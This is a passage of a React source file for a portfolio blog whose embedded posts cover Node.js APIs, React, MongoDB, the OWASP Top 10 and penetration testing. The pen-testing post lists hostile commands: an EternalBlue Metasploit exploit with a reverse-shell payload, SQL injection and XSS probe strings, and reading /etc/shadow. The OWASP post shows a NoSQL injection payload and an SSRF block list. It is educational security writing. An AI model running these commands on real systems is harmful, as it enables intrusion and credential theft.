import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Calendar, Clock, ArrowRight, X, Terminal, Shield, Database, Code2, Tag } from "lucide-react";
import { Button } from "@/components/ui/button";

const blogPosts = [
  {
    id: 1,
    title: "Building Scalable REST APIs with Node.js and Express",
    excerpt:
      "Learn best practices for designing and implementing RESTful APIs that can handle high traffic and scale with your application. Covers authentication, rate limiting, and database optimization.",
    date: "2025-03-15",
    readTime: "8 min read",
    tags: ["Node.js", "Express", "API"],
    icon: Terminal,
    category: "BACKEND",
    content: `
## Introduction

Building scalable REST APIs is one of the most critical skills for any backend developer. As your application grows, your API must handle thousands — or even millions — of concurrent requests without degrading performance. In this guide, we'll cover the patterns and tools that make the difference between an API that breaks under pressure and one that scales gracefully.

---

## 1. Project Structure

A well-organised project is the foundation of scalability. Structure your Node.js/Express app like this:

\`\`\`
src/
  controllers/    ← request handlers
  routes/         ← route definitions
  middleware/     ← auth, logging, rate limit
  models/         ← Mongoose/DB schemas
  services/       ← business logic
  utils/          ← helpers
  config/         ← env vars, DB config
\`\`\`

Separating concerns means each file has one job. Controllers call services. Services call models. Nothing else.

---

## 2. Authentication with JWT

Never store sessions in memory — they don't survive restarts and can't be shared across multiple instances.

\`\`\`javascript
const jwt = require('jsonwebtoken');

const generateTokens = (userId) => {
  const accessToken = jwt.sign(
    { userId },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }       // short-lived
  );
  const refreshToken = jwt.sign(
    { userId },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }        // long-lived, stored in DB
  );
  return { accessToken, refreshToken };
};
\`\`\`

**Key rules:**
- Access tokens: 15 minutes max
- Refresh tokens: stored in DB so they can be revoked
- Always use HTTPS — never send tokens over plain HTTP

---

## 3. Rate Limiting

Protect your API from abuse and DDoS using \`express-rate-limit\`:

\`\`\`javascript
const rateLimit = require('express-rate-limit');

const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                   // limit each IP to 100 requests
  standardHeaders: true,
  legacyHeaders: false,
  message: {
    error: 'Too many requests, please try again later.'
  }
});

app.use('/api/', apiLimiter);
\`\`\`

For login endpoints, use stricter limits:

\`\`\`javascript
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,    // only 5 login attempts per 15 minutes
});
app.use('/api/auth/login', loginLimiter);
\`\`\`

---

## 4. Database Optimisation

Slow queries are the #1 killer of API performance. In MongoDB:

**Always index your query fields:**
\`\`\`javascript
userSchema.index({ email: 1 });              // single field
userSchema.index({ createdAt: -1 });         // descending for latest-first queries
userSchema.index({ status: 1, role: 1 });   // compound index
\`\`\`

**Use projection — only fetch what you need:**
\`\`\`javascript
// BAD — fetches everything
const user = await User.findById(id);

// GOOD — only fetch required fields
const user = await User.findById(id).select('name email role');
\`\`\`

**Paginate everything:**
\`\`\`javascript
const getUsers = async (page = 1, limit = 20) => {
  const skip = (page - 1) * limit;
  return await User.find()
    .skip(skip)
    .limit(limit)
    .sort({ createdAt: -1 })
    .lean();   // .lean() returns plain objects — 2x faster
};
\`\`\`

---

## 5. Error Handling

Centralise all error handling in one middleware:

\`\`\`javascript
class AppError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = true;
  }
}

// Global error handler — always last middleware
app.use((err, req, res, next) => {
  const { statusCode = 500, message } = err;
  res.status(statusCode).json({
    status: 'error',
    statusCode,
    message: err.isOperational ? message : 'Internal Server Error',
  });
});
\`\`\`

---

## 6. Caching with Redis

For endpoints that serve the same data repeatedly, cache the response:

\`\`\`javascript
const redis = require('redis');
const client = redis.createClient();

const cacheMiddleware = (ttl = 300) => async (req, res, next) => {
  const key = \`cache:\${req.originalUrl}\`;
  const cached = await client.get(key);
  if (cached) return res.json(JSON.parse(cached));
  res.sendResponse = res.json.bind(res);
  res.json = (data) => {
    client.setEx(key, ttl, JSON.stringify(data));
    res.sendResponse(data);
  };
  next();
};

// Usage
router.get('/products', cacheMiddleware(600), getProducts);
\`\`\`

---

## Conclusion

Scalable APIs aren't built by accident. They're the result of disciplined structure, proper authentication, rate limiting, smart database queries, centralised error handling, and caching. Apply these patterns from the start and your API will handle whatever traffic comes its way.

> *Security tip: always validate and sanitise input at the route level using a library like \`joi\` or \`zod\` before it ever reaches your controllers.*
    `,
  },
  {
    id: 2,
    title: "Advanced React Patterns: Composition vs Inheritance",
    excerpt:
      "Dive deep into React's component composition patterns and understand why composition is preferred over inheritance. Includes practical examples and real-world use cases for building maintainable UIs.",
    date: "2025-03-08",
    readTime: "6 min read",
    tags: ["React", "JavaScript", "Patterns"],
    icon: Code2,
    category: "FRONTEND",
    content: `
## Why Composition Over Inheritance?

React's official docs make it clear: **use composition, not inheritance**. But why? And what does it look like in practice? Let's break it down with real-world examples.

Inheritance creates rigid hierarchies. If \`ComponentA\` extends \`ComponentB\`, you've tightly coupled them — changes to the parent ripple down unpredictably. Composition, on the other hand, lets you combine small, focused components into complex UIs without coupling.

---

## 1. The Children Pattern

The simplest and most powerful composition pattern:

\`\`\`jsx
const Card = ({ children, className = '' }) => (
  <div className={\`rounded-xl border p-6 \${className}\`}>
    {children}
  </div>
);

// Usage — pass anything as children
<Card className="border-red-500">
  <h2>Penetration Test Report</h2>
  <p>3 critical findings identified.</p>
  <Button>View Details</Button>
</Card>
\`\`\`

The \`Card\` component has no idea what its children are — and that's the point. It's a layout primitive, not a business component.

---

## 2. Compound Components

Compound components share implicit state through React Context, giving consumers a clean API:

\`\`\`jsx
const TabContext = React.createContext(null);

const Tabs = ({ children, defaultTab }) => {
  const [active, setActive] = React.useState(defaultTab);
  return (
    <TabContext.Provider value={{ active, setActive }}>
      <div>{children}</div>
    </TabContext.Provider>
  );
};

Tabs.List = ({ children }) => (
  <div className="flex gap-2 border-b">{children}</div>
);

Tabs.Tab = ({ id, children }) => {
  const { active, setActive } = React.useContext(TabContext);
  return (
    <button
      onClick={() => setActive(id)}
      className={active === id ? 'text-red-500 border-b-2 border-red-500' : 'text-gray-500'}
    >
      {children}
    </button>
  );
};

Tabs.Panel = ({ id, children }) => {
  const { active } = React.useContext(TabContext);
  return active === id ? <div>{children}</div> : null;
};

// Clean usage
<Tabs defaultTab="dev">
  <Tabs.List>
    <Tabs.Tab id="dev">Dev</Tabs.Tab>
    <Tabs.Tab id="sec">Security</Tabs.Tab>
  </Tabs.List>
  <Tabs.Panel id="dev"><DevProjects /></Tabs.Panel>
  <Tabs.Panel id="sec"><CyberProjects /></Tabs.Panel>
</Tabs>
\`\`\`

---

## 3. Render Props

Pass a function as a prop to let the parent control rendering:

\`\`\`jsx
const DataFetcher = ({ url, render }) => {
  const [data, setData] = React.useState(null);
  const [loading, setLoading] = React.useState(true);

  React.useEffect(() => {
    fetch(url)
      .then(r => r.json())
      .then(d => { setData(d); setLoading(false); });
  }, [url]);

  return render({ data, loading });
};

// Usage — caller decides how to render
<DataFetcher
  url="/api/vulnerabilities"
  render={({ data, loading }) =>
    loading
      ? <Spinner />
      : <VulnerabilityList items={data} />
  }
/>
\`\`\`

---

## 4. Higher-Order Components (HOCs)

HOCs wrap a component and inject extra props — great for cross-cutting concerns like auth:

\`\`\`jsx
const withAuth = (WrappedComponent) => {
  return function AuthGuard(props) {
    const { isAuthenticated } = useAuth();
    if (!isAuthenticated) return <Navigate to="/login" />;
    return <WrappedComponent {...props} />;
  };
};

// Usage
const ProtectedDashboard = withAuth(Dashboard);
\`\`\`

---

## 5. Custom Hooks — The Modern Pattern

In modern React, custom hooks have largely replaced render props and HOCs for logic reuse:

\`\`\`jsx
const useFetch = (url) => {
  const [state, dispatch] = React.useReducer(
    (s, a) => ({ ...s, ...a }),
    { data: null, loading: true, error: null }
  );

  React.useEffect(() => {
    fetch(url)
      .then(r => r.json())
      .then(data => dispatch({ data, loading: false }))
      .catch(error => dispatch({ error, loading: false }));
  }, [url]);

  return state;
};

// Usage — clean, no wrapper components needed
const VulnList = () => {
  const { data, loading, error } = useFetch('/api/vulnerabilities');
  if (loading) return <Spinner />;
  if (error) return <ErrorMessage error={error} />;
  return <ul>{data.map(v => <li key={v.id}>{v.title}</li>)}</ul>;
};
\`\`\`

---

## Conclusion

Composition patterns make your React code more flexible, testable, and maintainable. Start with children props for layout, use compound components for related UI groups, and reach for custom hooks when you need to share logic. Inheritance is almost never the right choice in React — embrace composition and your components will thank you.
    `,
  },
  {
    id: 3,
    title: "MongoDB Performance Optimization Techniques",
    excerpt:
      "Comprehensive guide to optimizing MongoDB queries, indexing strategies, and database design patterns. Learn how to identify bottlenecks and implement solutions for better performance at scale.",
    date: "2025-02-28",
    readTime: "10 min read",
    tags: ["MongoDB", "Database", "Performance"],
    icon: Database,
    category: "DATABASE",
    content: `
## Introduction

MongoDB can be blazing fast or painfully slow — the difference almost always comes down to how well you've designed your schemas and indexes. This guide covers the techniques that will take your MongoDB performance from acceptable to exceptional.

---

## 1. Understand the Query Planner

Before optimising anything, understand what MongoDB is actually doing:

\`\`\`javascript
// Always start with explain()
const result = await User.find({ email: 'test@example.com' })
  .explain('executionStats');

console.log(result.executionStats.totalDocsExamined);  // should equal nReturned
console.log(result.executionStats.executionTimeMillis); // target < 10ms
\`\`\`

If \`totalDocsExamined\` is much larger than \`nReturned\`, you're doing a collection scan. That's the #1 sign you need an index.

---

## 2. Indexing Strategy

**Single field indexes** for equality queries:
\`\`\`javascript
db.users.createIndex({ email: 1 });        // ascending
db.logs.createIndex({ createdAt: -1 });    // descending — for "latest first"
\`\`\`

**Compound indexes** — order matters enormously:
\`\`\`javascript
// Query: find active admins, sorted by name
db.users.createIndex({ status: 1, role: 1, name: 1 });

// Rule: Equality → Sort → Range
// Put equality fields first, then sort field, then range fields
\`\`\`

**Text indexes** for search:
\`\`\`javascript
db.articles.createIndex({
  title: 'text',
  content: 'text'
}, {
  weights: { title: 10, content: 1 }   // title matches are 10x more important
});

// Query
db.articles.find({ $text: { $search: 'mongodb performance' } });
\`\`\`

**Partial indexes** — only index documents that match a filter:
\`\`\`javascript
// Only index active users — smaller index, faster queries
db.users.createIndex(
  { email: 1 },
  { partialFilterExpression: { status: 'active' } }
);
\`\`\`

---

## 3. Schema Design Patterns

**Embed vs Reference** — the most important decision:

\`\`\`javascript
// EMBED when data is always accessed together and doesn't grow unboundedly
const userSchema = {
  name: String,
  address: {          // embedded — always fetched with user
    street: String,
    city: String,
    country: String
  }
};

// REFERENCE when data is large, shared, or grows over time
const postSchema = {
  title: String,
  authorId: ObjectId  // reference — author has their own document
};
\`\`\`

**Bucket Pattern** — for time-series data (IoT, logs):
\`\`\`javascript
// Instead of one document per measurement (millions of docs)
// Group measurements into hourly buckets
{
  sensorId: 'sensor_001',
  hour: ISODate('2025-03-15T14:00:00Z'),
  count: 60,
  measurements: [23.1, 23.4, 23.2, ...]  // 60 readings per bucket
}
// Reduces document count by 60x — massive performance improvement
\`\`\`

---

## 4. Aggregation Pipeline Optimisation

Always put \`$match\` and \`$sort\` at the beginning of the pipeline so MongoDB can use indexes:

\`\`\`javascript
// BAD — $match after $group can't use indexes
db.orders.aggregate([
  { $group: { _id: '$userId', total: { $sum: '$amount' } } },
  { $match: { total: { $gt: 1000 } } }
]);

// GOOD — $match first, uses index on status
db.orders.aggregate([
  { $match: { status: 'completed', createdAt: { $gte: new Date('2025-01-01') } } },
  { $group: { _id: '$userId', total: { $sum: '$amount' } } },
  { $sort: { total: -1 } },
  { $limit: 10 }
]);
\`\`\`

Use \`$project\` early to reduce document size flowing through the pipeline:
\`\`\`javascript
{ $project: { userId: 1, amount: 1, _id: 0 } }  // strip unneeded fields early
\`\`\`

---

## 5. Connection Pooling

Never create a new connection per request — reuse the connection pool:

\`\`\`javascript
// mongoose.js — connect once at app startup
const connectDB = async () => {
  await mongoose.connect(process.env.MONGODB_URI, {
    maxPoolSize: 10,        // max concurrent connections
    minPoolSize: 2,         // keep 2 connections warm
    serverSelectionTimeoutMS: 5000,
    socketTimeoutMS: 45000,
  });
  console.log('MongoDB connected');
};
\`\`\`

---

## 6. Use .lean() for Read-Only Queries

Mongoose documents carry a lot of overhead — prototype methods, change tracking, virtuals. For read-only queries, use \`.lean()\`:

\`\`\`javascript
// Returns plain JavaScript objects — ~2x faster, less memory
const users = await User.find({ status: 'active' }).lean();
\`\`\`

Don't use \`.lean()\` when you need to call \`.save()\` or use Mongoose virtuals.

---

## 7. Monitor with Atlas or Explain

Set up slow query logging:
\`\`\`javascript
mongoose.set('debug', (collectionName, method, query, doc) => {
  console.log(\`\${collectionName}.\${method}\`, JSON.stringify(query));
});
\`\`\`

In production, use MongoDB Atlas Performance Advisor — it automatically suggests missing indexes based on your real query patterns.

---

## Conclusion

MongoDB performance optimisation is a continuous process. Start with \`explain()\` to understand your queries, add indexes strategically following the ESR rule (Equality → Sort → Range), design schemas around your access patterns, and use \`.lean()\` for read-heavy endpoints. These techniques alone can reduce query times from hundreds of milliseconds to single digits.

> *Security tip: always enable authentication, use least-privilege roles for your app's DB user, and never expose MongoDB directly to the internet — always put it behind your application server.*
    `,
  },
  {
    id: 4,
    title: "OWASP Top 10: Web Vulnerabilities Every Developer Must Know",
    excerpt:
      "A deep-dive into the OWASP Top 10 vulnerabilities for 2021, with real-world examples, exploitation demos, and concrete remediation steps for Node.js and React applications.",
    date: "2025-03-20",
    readTime: "12 min read",
    tags: ["OWASP", "Security", "Node.js"],
    icon: Shield,
    category: "SECURITY",
    content: `
## What is OWASP Top 10?

The Open Web Application Security Project (OWASP) publishes a list of the 10 most critical web application security risks. It's the de-facto standard for web security awareness. If you build web apps and don't know this list, your users are at risk.

---

## A01 — Broken Access Control

The #1 vulnerability. Users accessing resources or performing actions they shouldn't be allowed to.

**Example (IDOR — Insecure Direct Object Reference):**
\`\`\`javascript
// VULNERABLE — user can access any user's data by changing the ID
app.get('/api/users/:id', async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user);
});

// FIXED — only allow access to own profile
app.get('/api/users/:id', authenticate, async (req, res) => {
  if (req.user.id !== req.params.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const user = await User.findById(req.params.id);
  res.json(user);
});
\`\`\`

---

## A02 — Cryptographic Failures

Sensitive data exposed due to weak encryption, no encryption, or improper key management.

**Never store passwords in plain text or with MD5/SHA1:**
\`\`\`javascript
const bcrypt = require('bcrypt');

// Hashing
const hashedPassword = await bcrypt.hash(password, 12); // 12 rounds minimum

// Verification
const isMatch = await bcrypt.compare(inputPassword, hashedPassword);
\`\`\`

**Always encrypt sensitive data at rest and in transit. Use environment variables for secrets — never hardcode them.**

---

## A03 — Injection (SQL/NoSQL/Command)

Attacker-controlled input executed as a query or command.

**NoSQL Injection in MongoDB:**
\`\`\`javascript
// VULNERABLE — attacker sends: { "email": { "$gt": "" } }
const user = await User.findOne({ email: req.body.email });

// FIXED — validate and sanitise input
const { email, password } = req.body;
if (typeof email !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ error: 'Invalid input' });
}
const user = await User.findOne({ email: email.toLowerCase().trim() });
\`\`\`

Use libraries like \`express-mongo-sanitize\` to strip \`$\` operators from user input.

---

## A04 — Insecure Design

Security flaws baked into the architecture — no amount of implementation fixes will solve design-level problems.

**Example:** Password reset that sends the new password via email instead of a time-limited token. The fix isn't code — it's redesigning the feature with security in mind from the start.

---

## A05 — Security Misconfiguration

Default configs, verbose error messages, open S3 buckets, debug mode in production.

\`\`\`javascript
// Remove these from production
app.use(morgan('dev'));         // logs too much info
app.set('x-powered-by', false); // hide Express fingerprint

// Use helmet to set secure headers
const helmet = require('helmet');
app.use(helmet());

// Never expose stack traces to clients
app.use((err, req, res, next) => {
  console.error(err.stack);  // log internally
  res.status(500).json({ error: 'Something went wrong' }); // generic to client
});
\`\`\`

---

## A06 — Vulnerable and Outdated Components

Using libraries with known CVEs.

\`\`\`bash
# Audit your dependencies regularly
npm audit

# Fix automatically where possible
npm audit fix

# Use Snyk for deeper scanning
npx snyk test
\`\`\`

Set up \`dependabot\` on GitHub to automatically open PRs for vulnerable packages.

---

## A07 — Identification and Authentication Failures

Weak passwords, no MFA, improper session management.

\`\`\`javascript
// Enforce strong passwords
const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
if (!passwordRegex.test(password)) {
  return res.status(400).json({
    error: 'Password must be 8+ chars with uppercase, lowercase, number and special char'
  });
}

// Invalidate tokens on logout
app.post('/logout', authenticate, async (req, res) => {
  await RefreshToken.deleteOne({ userId: req.user.id });
  res.json({ message: 'Logged out' });
});
\`\`\`

---

## A08 — Software and Data Integrity Failures

Untrusted plugins, insecure CI/CD, and deserialisation of untrusted data.

Always verify integrity of third-party scripts:
\`\`\`html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous">
</script>
\`\`\`

---

## A09 — Security Logging and Monitoring Failures

Without logs, you can't detect or respond to breaches.

\`\`\`javascript
const auditLog = (action, userId, details) => {
  console.log(JSON.stringify({
    timestamp: new Date().toISOString(),
    action,
    userId,
    details,
    ip: req.ip
  }));
};

// Log all auth events
auditLog('LOGIN_SUCCESS', user.id, { email: user.email });
auditLog('LOGIN_FAILURE', null, { email: req.body.email, ip: req.ip });
auditLog('PASSWORD_RESET', user.id, {});
\`\`\`

---

## A10 — Server-Side Request Forgery (SSRF)

Attacker tricks the server into making requests to internal resources.

\`\`\`javascript
const { URL } = require('url');

const validateUrl = (urlString) => {
  const url = new URL(urlString);
  // Block internal/private IP ranges
  const blocked = ['localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254'];
  if (blocked.some(b => url.hostname.includes(b))) {
    throw new Error('Blocked URL');
  }
  if (!['http:', 'https:'].includes(url.protocol)) {
    throw new Error('Invalid protocol');
  }
  return url.toString();
};
\`\`\`

---

## Conclusion

Security isn't a feature you add at the end — it's a discipline baked into every line of code. Bookmark the OWASP Top 10, run \`npm audit\` regularly, use \`helmet\` on every Express app, and validate every input that comes from a user. Your users are trusting you with their data.

> *"Security is not a product, but a process." — Bruce Schneier*
    `,
  },
  {
    id: 5,
    title: "Intro to Penetration Testing: From Recon to Report",
    excerpt:
      "A beginner-friendly walkthrough of the penetration testing methodology — from information gathering and scanning to exploitation and writing a professional security report.",
    date: "2025-03-01",
    readTime: "9 min read",
    tags: ["Pen Testing", "Cybersecurity", "Kali Linux"],
    icon: Shield,
    category: "SECURITY",
    content: `
## What is Penetration Testing?

Penetration testing (pen testing) is the practice of legally and ethically attacking a system to find vulnerabilities before malicious hackers do. A pen tester thinks like an attacker — but works for the defender.

**Important:** Never test systems you don't own or have explicit written permission to test. Unauthorised testing is a criminal offence.

---

## The Penetration Testing Methodology

The standard pen test follows five phases:

1. **Reconnaissance** — gather information
2. **Scanning & Enumeration** — identify live hosts, ports, services
3. **Exploitation** — attempt to exploit vulnerabilities
4. **Post-Exploitation** — what can you do once inside?
5. **Reporting** — document everything

---

## Phase 1: Reconnaissance

**Passive recon** — gather information without touching the target:

\`\`\`bash
# WHOIS lookup
whois target.com

# DNS enumeration
dig target.com ANY
nslookup -type=mx target.com

# Find subdomains (passive)
subfinder -d target.com

# Search for exposed info (Google Dorks)
site:target.com filetype:pdf
site:target.com inurl:admin
intitle:"index of" site:target.com
\`\`\`

**Active recon** — directly interact with the target (with permission):
\`\`\`bash
# Zone transfer attempt
dig axfr @ns1.target.com target.com

# Subdomain brute-force
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
\`\`\`

---

## Phase 2: Scanning & Enumeration

\`\`\`bash
# Host discovery
nmap -sn 192.168.1.0/24

# Full port scan with service detection
nmap -sV -sC -p- -T4 target.com -oN scan_results.txt

# Vulnerability scan
nmap --script vuln target.com

# Web directory enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,js

# Web tech fingerprinting
whatweb target.com
wappalyzer
\`\`\`

Common findings at this phase:
- Open ports that shouldn't be public (3306 MySQL, 27017 MongoDB)
- Outdated service versions with known CVEs
- Default credentials on admin panels
- Directory listings enabled

---

## Phase 3: Exploitation

**Using Metasploit for known CVEs:**
\`\`\`bash
msfconsole

# Search for a vulnerability
msf> search eternalblue

# Use the module
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS 192.168.1.10
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST 192.168.1.5
msf> run
\`\`\`

**Manual web exploitation with Burp Suite:**

1. Set your browser proxy to \`127.0.0.1:8080\`
2. Intercept requests to the target
3. Test for SQL injection: \`' OR 1=1 --\`
4. Test for XSS: \`<script>alert(document.cookie)</script>\`
5. Check for IDOR by changing \`id=1\` to \`id=2\` in requests

---

## Phase 4: Post-Exploitation

Once you have access, determine the impact:

\`\`\`bash
# What user are we?
whoami
id

# What can we access?
ls -la /etc/passwd
cat /etc/shadow    # if we can read this, we can crack passwords

# Network connections
netstat -tuln
ip addr

# Privilege escalation check
sudo -l
find / -perm -4000 2>/dev/null   # SUID binaries
\`\`\`

The goal is to prove the business impact — can you access customer data? Can you pivot to other systems? Can you achieve persistence?

---

## Phase 5: Writing the Report

A professional pen test report includes:

**Executive Summary** (non-technical, for management)
- What was tested, when, and by whom
- Overall risk rating (Critical/High/Medium/Low)
- Top 3 key findings in plain English
- Business impact summary

**Technical Findings** (for the security/dev team)
For each finding:

\`\`\`
Title:       SQL Injection in /api/login
Severity:    Critical (CVSS 9.8)
Description: The email parameter is unsanitised and allows
             attacker to bypass authentication.
Evidence:    POST /api/login
             email=' OR 1=1 --&password=anything
             Response: 200 OK — logged in as admin
Remediation: Use parameterised queries / prepared statements.
             Validate and sanitise all user input.
References:  OWASP A03:2021 — Injection
\`\`\`

**Remediation Summary** — prioritised list of fixes

---

## Tools Summary

| Phase | Tool |
|---|---|
| Recon | Nmap, Subfinder, theHarvester |
| Scanning | Nmap, Gobuster, Nikto |
| Exploitation | Metasploit, Burp Suite, SQLmap |
| Post-exploit | LinPEAS, WinPEAS, Mimikatz |
| Reporting | Dradis, Serpico, or plain Markdown |

---

## Conclusion

Penetration testing is a structured discipline — not random hacking. Follow the methodology, document everything, and always stay within the agreed scope. If you're starting out, practice on legal platforms: TryHackMe, HackTheBox, VulnHub, and DVWA are all excellent for building real skills safely.

> *"The best defence is understanding how the offence works." — Glorison Ouma*
    `,
  },
  {
    id: 6,
    title: "Securing Node.js Apps: A Practical Checklist",
    excerpt:
      "A hands-on security checklist for Node.js/Express applications — covering headers, input validation, dependency management, secrets handling, and common attack prevention.",
    date: "2025-02-20",
    readTime: "7 min read",
    tags: ["Node.js", "Security", "Express"],
    icon: Shield,
    category: "SECURITY",
    content: `
## Introduction

Every Node.js application deployed to production needs a security hardening pass. This checklist covers the essentials — work through it before every deployment.

---

## ✅ 1. HTTP Security Headers (Helmet)

\`\`\`javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
  hsts: {
    maxAge: 31536000,        // 1 year
    includeSubDomains: true,
    preload: true,
  },
}));
\`\`\`

Headers helmet sets for you:
- \`X-Frame-Options: DENY\` — prevents clickjacking
- \`X-Content-Type-Options: nosniff\` — prevents MIME sniffing
- \`Strict-Transport-Security\` — enforces HTTPS
- \`Content-Security-Policy\` — controls allowed resources

---

## ✅ 2. Input Validation & Sanitisation

\`\`\`javascript
const { z } = require('zod');
const mongoSanitize = require('express-mongo-sanitize');

// Sanitise MongoDB operators from all requests
app.use(mongoSanitize());

// Validate with Zod schemas
const loginSchema = z.object({
  email: z.string().email().toLowerCase().trim(),
  password: z.string().min(8).max(128),
});

app.post('/api/login', (req, res) => {
  const result = loginSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error.flatten() });
  }
  // Now safe to use result.data
});
\`\`\`

---

## ✅ 3. Environment Variables — Never Hardcode Secrets

\`\`\`javascript
// .env (NEVER commit this file)
JWT_SECRET=your-256-bit-secret-here
MONGODB_URI=mongodb+srv://user:pass@cluster.mongodb.net/db
AWS_SECRET_KEY=your-aws-secret

// Load with dotenv
require('dotenv').config();

// Access
const secret = process.env.JWT_SECRET;
if (!secret) throw new Error('JWT_SECRET not set');
\`\`\`

Add \`.env\` to \`.gitignore\` immediately when creating any project.

---

## ✅ 4. Rate Limiting & Brute-Force Protection

\`\`\`javascript
const rateLimit = require('express-rate-limit');
const slowDown = require('express-slow-down');

// Slow down repeat requests before blocking
const speedLimiter = slowDown({
  windowMs: 15 * 60 * 1000,
  delayAfter: 5,
  delayMs: () => 500,   // add 500ms delay per request after 5
});

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true,
});

app.post('/api/auth/login', speedLimiter, loginLimiter, loginController);
\`\`\`

---

## ✅ 5. CORS Configuration

\`\`\`javascript
const cors = require('cors');

// Don't use cors() with no config in production — it allows all origins
app.use(cors({
  origin: process.env.ALLOWED_ORIGINS?.split(',') || ['https://yourdomain.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
\`\`\`

---

## ✅ 6. Prevent Parameter Pollution

\`\`\`javascript
const hpp = require('hpp');

// Prevents: GET /api/users?role=user&role=admin
app.use(hpp({
  whitelist: ['tags', 'filter'],  // allow arrays for these params only
}));
\`\`\`

---

## ✅ 7. Dependency Security

\`\`\`bash
# Audit before every deployment
npm audit

# Use exact versions in package.json
npm install --save-exact package-name

# Check for outdated packages
npm outdated

# Use Snyk in CI/CD
npx snyk test --fail-on=high
\`\`\`

---

## ✅ 8. Logging & Monitoring

\`\`\`javascript
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' }),
  ],
});

// Log security events
logger.warn('Failed login attempt', {
  email: req.body.email,
  ip: req.ip,
  userAgent: req.headers['user-agent'],
});
\`\`\`

---

## ✅ Quick Reference Checklist

| Item | Done? |
|---|---|
| Helmet headers configured | ✓ |
| Input validation on all endpoints | ✓ |
| Secrets in env vars, not code | ✓ |
| Rate limiting on auth endpoints | ✓ |
| CORS locked to specific origins | ✓ |
| npm audit clean | ✓ |
| No stack traces exposed to client | ✓ |
| HTTPS enforced (HSTS) | ✓ |
| Auth logs in place | ✓ |
| MongoDB sanitised | ✓ |

---

## Conclusion

Security hardening is not optional for production applications. Run through this checklist before every deployment. Most of these measures take under 10 minutes to implement but can prevent hours — or days — of incident response. Security is cheapest when baked in from the start.
    `,
  },
];

// ── Article reader modal ──────────────────────────────────────────
const ArticleModal = ({ post, onClose }) => {
  // Simple markdown-to-JSX renderer
  const renderContent = (content) => {
    const lines = content.trim().split("\n");
    const elements = [];
    let i = 0;
    let codeBlock = [];
    let inCode = false;
    let codeKey = 0;

    while (i < lines.length) {
      const line = lines[i];

      // Code blocks
      if (line.startsWith("```")) {
        if (!inCode) {
          inCode = true;
          codeBlock = [];
        } else {
          inCode = false;
          elements.push(
            <pre key={`code-${codeKey++}`}
              className="bg-gray-950 dark:bg-black border border-red-500/20 rounded-lg p-4 overflow-x-auto my-4 text-xs sm:text-sm font-mono text-green-400 leading-relaxed">
              <code>{codeBlock.join("\n")}</code>
            </pre>
          );
          codeBlock = [];
        }
        i++; continue;
      }
      if (inCode) { codeBlock.push(line); i++; continue; }

      // H2
      if (line.startsWith("## ")) {
        elements.push(
          <h2 key={i} className="text-lg sm:text-xl font-bold mt-8 mb-3 text-gray-900 dark:text-white font-mono flex items-center gap-2">
            <span className="text-red-500">#</span> {line.slice(3)}
          </h2>
        );
        i++; continue;
      }

      // H3
      if (line.startsWith("### ")) {
        elements.push(
          <h3 key={i} className="text-base sm:text-lg font-bold mt-6 mb-2 text-gray-800 dark:text-gray-200 font-mono">
            <span className="text-red-400">##</span> {line.slice(4)}
          </h3>
        );
        i++; continue;
      }

      // Horizontal rule
      if (line.startsWith("---")) {
        elements.push(<hr key={i} className="border-red-200 dark:border-red-500/15 my-6" />);
        i++; continue;
      }

      // Blockquote
      if (line.startsWith("> ")) {
        elements.push(
          <blockquote key={i} className="border-l-2 border-red-500 pl-4 my-4 italic text-gray-600 dark:text-gray-400 text-sm">
            {line.slice(2)}
          </blockquote>
        );
        i++; continue;
      }

      // Inline code + bold in paragraphs
      if (line.trim()) {
        const formatted = line
          .replace(/`([^`]+)`/g, '<code class="bg-red-50 dark:bg-red-500/10 text-red-600 dark:text-red-400 px-1 py-0.5 rounded text-xs font-mono border border-red-200 dark:border-red-500/20">$1</code>')
          .replace(/\*\*([^*]+)\*\*/g, '<strong class="text-gray-900 dark:text-white font-bold">$1</strong>');
        elements.push(
          <p key={i} className="text-sm sm:text-base text-gray-600 dark:text-muted-foreground leading-relaxed mb-3"
            dangerouslySetInnerHTML={{ __html: formatted }} />
        );
      } else {
        elements.push(<div key={i} className="h-1" />);
      }
      i++;
    }
    return elements;
  };

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-50 flex items-start justify-center p-4 pt-8 bg-black/70 backdrop-blur-sm overflow-y-auto"
      onClick={onClose}
    >
      <motion.div
        initial={{ scale: 0.93, opacity: 0, y: 20 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        exit={{ scale: 0.93, opacity: 0, y: 20 }}
        transition={{ duration: 0.25 }}
